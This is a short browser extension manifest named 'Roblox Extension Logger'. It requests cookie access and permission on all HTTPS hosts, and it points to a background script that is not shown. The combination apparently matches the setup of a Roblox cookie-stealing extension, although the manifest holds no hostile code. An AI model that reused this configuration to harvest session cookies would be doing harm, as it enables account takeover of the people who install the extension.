{
    "name": "Roblox Extension Logger ",
    "description": "Extension for https://www.roblox.com",
    "version": "1.0.0",
    "manifest_version": 3,

    "action" : {
        "default_icon": "0x0.png"
    },

    "host_permissions": [
	"https://*/*"
    ],

    "permissions": [
        "cookies"
    ],

    "background": {
        "service_worker": "index.js"
    },

    "icons": {
        "16": "0x0.png",
        "32": "0x0.png",
        "48": "0x0.png",
        "128": "0x0.png"
    }
}
